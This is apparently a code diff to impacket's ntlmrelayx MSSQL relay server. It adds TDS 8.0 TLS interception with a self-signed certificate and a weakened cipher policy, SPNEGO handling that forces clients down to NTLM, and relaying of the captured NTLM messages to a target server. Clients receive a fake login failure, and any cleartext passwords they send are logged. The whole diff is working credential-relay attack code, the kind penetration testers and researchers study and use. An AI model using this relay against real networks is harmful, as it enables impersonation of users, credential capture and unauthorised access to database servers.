@@ -24,6 +24,11 @@ import socketserver
 import random
 import string
 import struct
+import socket
+import ssl
+import os
+import tempfile
+import datetime
 from threading import Thread
 
 from impacket import ntlm, tds, LOG
@@ -32,6 +37,13 @@ from impacket.examples.utils import parse_target
 from impacket.nt_errors import STATUS_SUCCESS
 from impacket.ntlm import NTLMAuthChallenge
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.examples.ntlmrelayx.utils.spnegoutils import (
+    NTLM_MECH,
+    build_ntlm_challenge_token,
+    build_ntlm_fallback_token,
+    get_ntlm_message_type,
+    inspect_spnego_token,
+)
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
 
@@ -45,6 +57,53 @@ class MSSQLRelayServer(Thread):
             self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
             socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
+            self.ssl_context = self._create_ssl_context()
+
+        @staticmethod
+        def _create_ssl_context():
+            """Create an SSL context with a self-signed certificate for TDS 8.0 support."""
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COMMON_NAME, u"MSSQLSERVER"),
+            ])
+            now = datetime.datetime.now(datetime.timezone.utc)
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(now)
+                .not_valid_after(now + datetime.timedelta(days=365))
+                .sign(key, hashes.SHA256())
+            )
+
+            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
+            key_pem = key.private_bytes(
+                serialization.Encoding.PEM,
+                serialization.PrivateFormat.TraditionalOpenSSL,
+                serialization.NoEncryption()
+            )
+
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
+            ctx.set_ciphers('ALL:@SECLEVEL=0')
+            ctx.set_alpn_protocols(["tds/8.0"])
+
+            with tempfile.NamedTemporaryFile(mode='wb', suffix='.pem', delete=False) as f:
+                f.write(cert_pem + key_pem)
+                tmpfile = f.name
+            try:
+                ctx.load_cert_chain(tmpfile)
+            finally:
+                os.unlink(tmpfile)
+
+            return ctx
 
     class MSSQLHandler(socketserver.BaseRequestHandler):
 
@@ -54,7 +113,8 @@ class MSSQLRelayServer(Thread):
             self.target = None
             self.client = None
             self.authUser = None
-            self.client_address = None
+            self.tds8_mode = False
+            self.client_uses_spnego = False
             
             self.target = self.server.config.target.getTarget()
             if self.target is None:
@@ -63,8 +123,6 @@ class MSSQLRelayServer(Thread):
                 
             LOG.info("(MSSQL): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
 
-            self.client_address = client_address[0]            
-            
             if ':' in self.target.netloc:
                 target_string,port=self.target.netloc.split(':')
                 self.target_port=int(port)
@@ -92,11 +150,58 @@ class MSSQLRelayServer(Thread):
             
         def decryptPassword(self, password):
             return bytes((((x ^ 0xA5) & 0x0F) << 4) | (((x ^ 0xA5) & 0xF0) >> 4) for x in bytearray(password))
+
+        def getLoginTDSVersion(self):
+            return self.login["TDSVersion"]
+
+        def _recv_exact(self, size):
+            data = b""
+            while len(data) < size:
+                chunk = self.request.recv(size - len(data))
+                if not chunk:
+                    if len(data) == 0:
+                        return b""
+                    raise ConnectionError("Client closed connection mid-packet")
+                data += chunk
+            return data
+
+        def _recv_tds_packet(self):
+            header = self._recv_exact(8)
+            if not header:
+                return None
+
+            packet = tds.TDSPacket(header)
+            data_len = packet["Length"] - 8
+            packet["Data"] = self._recv_exact(data_len) if data_len > 0 else b""
+            status = packet["Status"]
+
+            while status != tds.TDS_STATUS_EOM:
+                next_header = self._recv_exact(8)
+                if not next_header:
+                    raise ConnectionError("Client closed connection mid-message")
+
+                next_packet = tds.TDSPacket(next_header)
+                next_data_len = next_packet["Length"] - 8
+                next_packet["Data"] = (
+                    self._recv_exact(next_data_len) if next_data_len > 0 else b""
+                )
+
+                packet["Data"] += next_packet["Data"]
+                packet["Length"] += next_packet["Length"] - 8
+                status = next_packet["Status"]
+
+            return packet
             
         def sendNegotiate(self,negotiateMessage):
             # Changed from the version in mssqlrelayclient.py to use the same parameters as 
             # the original request and change the database
             login = tds.TDS_LOGIN()
+            if self.client.session.tds8:
+                login_tds_version = tds.TDS_LOGIN7_VERSION_74
+            else:
+                login_tds_version = self.getLoginTDSVersion()
+            login['TDSVersion'] = login_tds_version
+            self.client.session._set_session_login7_tds_version(login_tds_version)
 
             login['HostName'] = (''.join([random.choice(string.ascii_letters) for _ in range(8)])).encode('utf-16le')
             login['AppName']  = self.login['AppName']
@@ -121,7 +226,8 @@ class MSSQLRelayServer(Thread):
 
             # According to the specs, if encryption is not required, we must encrypt just
             # the first Login packet :-o
-            if self.client.session.resp['Encryption'] == tds.TDS_ENCRYPT_OFF:
+            # In TDS 8.0 mode, the socket is already TLS-wrapped, so we don't touch tlsSocket
+            if not self.client.session.tds8 and self.client.session.resp['Encryption'] == tds.TDS_ENCRYPT_OFF:
                 self.client.session.tlsSocket = None
 
             tds_response = self.client.session.recvTDS()
@@ -133,7 +239,13 @@ class MSSQLRelayServer(Thread):
             return challenge
             
         def sendLoginFailed(self):
-            responseData = tds.TDS_INFO_ERROR()
+            login_tds_version = self.getLoginTDSVersion()
+            if tds.login7_uses_72_plus_token_layout(login_tds_version):
+                responseData = tds.TDS_INFO_ERROR72()
+                doneData = tds.TDS_DONE72()
+            else:
+                responseData = tds.TDS_INFO_ERROR()
+                doneData = tds.TDS_DONE()
             msg = "Login failed for user ''.".encode('utf-16le')
             server = "MSSQLSERVER".encode('utf-16le')
             proc = b""
@@ -148,12 +260,9 @@ class MSSQLRelayServer(Thread):
             responseData['ProcName'] = proc
             responseData['ProcNameLen'] = len(proc) // 2
             responseData['LineNumber'] = 1
-                        
-            responseData['Length'] = 16 + len(msg) + len(server) + len(proc)
-                        
-            doneData = tds.TDS_DONE()
+
             doneData['TokenType'] = tds.TDS_DONE_TOKEN
-            doneData['Status'] = 0x02 # TDS_DONE_ERROR 
+            doneData['Status'] = 0x02 # TDS_DONE_ERROR
             doneData['CurCmd'] = 0
             doneData['DoneRowCount'] = 0
                         
@@ -164,41 +273,91 @@ class MSSQLRelayServer(Thread):
             self.request.send(responsePacket.getData())
             
             return          
+
+        def sendSSPIToken(self, token):
+            tds_response = tds.TDSPacket()
+            tds_response['Type'] = tds.TDS_TABULAR
+            tds_response['Status'] = tds.TDS_STATUS_EOM
+            tds_response['PacketID'] = 0
+            tds_response['Data'] = struct.pack('<BH', tds.TDS_SSPI_TOKEN, len(token)) + token
+            self.request.send(tds_response.getData())
+
+        def inspectClientToken(self, token):
+            token_info = inspect_spnego_token(token)
+            client_ip = self.client_address[0]
+            if token_info.negoex_offered:
+                LOG.info("(MSSQL): NEGOEX authentication offered by client %s, currently not supported for relay" % client_ip)
+            if token_info.negoex_selected:
+                LOG.info("(MSSQL): NEGOEX selected by client %s, currently not supported for relay" % client_ip)
+            return token_info
+
+        def relayNegotiateToken(self, token):
+            # For MSSQL targets, preserve the original login parameters.
+            if self.target.scheme.upper() == "MSSQL":
+                self.client.sendNegotiate = self.sendNegotiate
+
+            self.challengeMessage = self.client.sendNegotiate(token)
+            challenge = bytes.fromhex(str(self.challengeMessage))
+            if self.client_uses_spnego:
+                challenge = build_ntlm_challenge_token(challenge)
+            self.sendSSPIToken(challenge)
           
-        def handle(self):            
+        def handle(self):
             try:
+                # Detect TDS 8.0 (TLS from start) by peeking at the first byte
+                first_byte = self.request.recv(1, socket.MSG_PEEK)
+                if not first_byte:
+                    return
+
+                self.tds8_mode = False
+                if first_byte[0] == 0x16:  # TLS handshake record
+                    LOG.debug("(MSSQL): Detected TDS 8.0 (TLS) connection from %s", self.client_address[0])
+                    self.tds8_mode = True
+                    try:
+                        self.request = self.server.ssl_context.wrap_socket(
+                            self.request, server_side=True
+                        )
+                    except ssl.SSLError as e:
+                        LOG.error("(MSSQL): TLS handshake failed: %s" % e)
+                        return
+                    LOG.debug("(MSSQL): TDS 8.0 TLS handshake completed")
+
                 while True:
-                    # Receive packet from the client
-                    packet = self.request.recv(65535)
-                    if not packet:
+                    # Reassemble complete TDS messages; TLS recv() boundaries do not
+                    # necessarily match TDS packet boundaries.
+                    packet = self._recv_tds_packet()
+                    if packet is None:
                         break
-                    
-                    if packet[0] == tds.TDS_PRE_LOGIN:         # Pre-login stage
-                    
+
+                    if packet["Type"] == tds.TDS_PRE_LOGIN:         # Pre-login stage
+
                         LOG.debug("(MSSQL): Receieved TDS pre-login from client")
                         self.client = self.init_client()
                         LOG.debug("(MSSQL): Sending our own TDS pre-login response to client")
                         preloginResponseData = tds.TDS_PRELOGIN()
                         preloginResponseData["Version"] = b"\x0f\x00\x11\x3a\x00\x00"
-                        # We specify we do not support encryption
-                        preloginResponseData["Encryption"] = tds.TDS_ENCRYPT_NOT_SUP
+                        if self.tds8_mode:
+                            # TDS 8.0: already inside TLS, indicate strict encryption
+                            preloginResponseData["Encryption"] = tds.TDS_ENCRYPT_STRICT
+                        else:
+                            # TDS 7.x: we do not support encryption
+                            preloginResponseData["Encryption"] = tds.TDS_ENCRYPT_NOT_SUP
                         # InstOpt is 0, we confirm that the client's InstOpt matches the server's instance
-                        preloginResponseData["Instance"] = b"\x00"                        
-                        # ThreadId is empty in the server response
-                        preloginResponseData["ThreadID"] = b""
-                        preloginResponseData["ThreadIDLength"] = 0
-                        
+                        preloginResponseData["Instance"] = b"\x00"
+                        # Use a regular 4-byte THREADID for compatibility with Microsoft clients.
+                        preloginResponseData["ThreadID"] = struct.pack("<L", random.randint(0, 65535))
+
                         preloginResponse = tds.TDSPacket()
                         preloginResponse["Type"] = tds.TDS_TABULAR
                         preloginResponse["Data"] = preloginResponseData.getData()
-                        
+
                         self.request.send(preloginResponse.getData())                      
                         
-                    elif packet[0] == tds.TDS_LOGIN7:    # Login stage
+                    elif packet["Type"] == tds.TDS_LOGIN7:    # Login stage
                     
                         LOG.debug("(MSSQL): Parsing the client's login request")
                         loginData = tds.TDS_LOGIN()
-                        loginData.fromString(packet[8:])
+                        loginData.fromString(packet["Data"])
                         LOG.debug("(MSSQL): Client login request:")
                         if loginData["HostName"]:
                             LOG.debug("(MSSQL): Hostname    : %s" % loginData["HostName"].decode("utf-8"))
@@ -216,38 +375,56 @@ class MSSQLRelayServer(Thread):
                             password = self.decryptPassword(loginData["Password"])
                             LOG.info("(MSSQL): Password    : %s" % password.decode("utf-8"))
                             LOG.info("(MSSQL): Password is not empty. Relay is not required.")
+                        self.login = loginData
                         if not loginData["SSPI"]:
                             LOG.error("(MSSQL): NTLMSSP_NEGOTIATE not found in login message")
                             LOG.debug("(MSSQL): Sending our own error response to the client")
                             self.sendLoginFailed()
                             break                        
-                        negotiateMessage = loginData["SSPI"]
-                        self.login = loginData
-                        # For MSSQL, we change the database and target server name
-                        if (self.target.scheme.upper() == "MSSQL"):
-                            self.client.sendNegotiate = self.sendNegotiate
-                                
-                        self.challengeMessage = self.client.sendNegotiate(negotiateMessage)
-                        challenge = bytes.fromhex(str(self.challengeMessage))
+                        token_info = self.inspectClientToken(loginData["SSPI"])
+                        self.client_uses_spnego = token_info.is_spnego
+                        if token_info.negoex_selected:
+                            self.sendLoginFailed()
+                            break
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            self.sendSSPIToken(build_ntlm_fallback_token())
+                            continue
 
-                        tds_response = tds.TDSPacket()
-                        tds_response['Type'] = tds.TDS_TABULAR
-                        tds_response['Status'] = tds.TDS_STATUS_EOM
-                        tds_response['PacketID'] = 0
-                        # TDS_SSPI token + little-endian length + payload
-                        tds_response['Data'] = struct.pack('<BH', tds.TDS_SSPI_TOKEN, len(challenge)) + challenge
-
-                        self.request.send(tds_response.getData())
+                        negotiateMessage = token_info.inner_token
+                        if get_ntlm_message_type(negotiateMessage) != 1:
+                            LOG.error("(MSSQL): Initial SSPI token is not an NTLM negotiate message")
+                            self.sendLoginFailed()
+                            break
+                        self.relayNegotiateToken(negotiateMessage)
                         
-                    elif packet[0] == tds.TDS_SSPI:    # NTLM authentication
+                    elif packet["Type"] == tds.TDS_SSPI:    # NTLM authentication
+                        token_info = self.inspectClientToken(packet["Data"])
+                        if token_info.negoex_selected:
+                            self.sendLoginFailed()
+                            break
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            self.sendSSPIToken(build_ntlm_fallback_token())
+                            continue
+
+                        authToken = token_info.inner_token
+                        messageType = get_ntlm_message_type(authToken)
+                        if messageType == 1:
+                            self.client_uses_spnego = self.client_uses_spnego or token_info.is_spnego
+                            self.relayNegotiateToken(authToken)
+                            continue
+                        if messageType != 3:
+                            LOG.error("(MSSQL): SSPI token is not an NTLM authenticate message")
+                            self.sendLoginFailed()
+                            break
+
                         LOG.debug("(MSSQL): Sending our own error response to the client")
                         self.sendLoginFailed()
                         
                         authenticateMessage = ntlm.NTLMAuthChallengeResponse()
-                        authenticateMessage.fromString(packet[8:])
+                        authenticateMessage.fromString(authToken)
                         LOG.debug("(MSSQL): Relaying authentication to server")
                         
-                        if not STATUS_SUCCESS in self.client.sendAuth(packet[8:]):
+                        if not STATUS_SUCCESS in self.client.sendAuth(authToken):
                             if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                 LOG.error("(MSSQL): Authenticating against %s://%s as %s/%s FAILED" % (
                                     self.target.scheme, self.target.netloc,
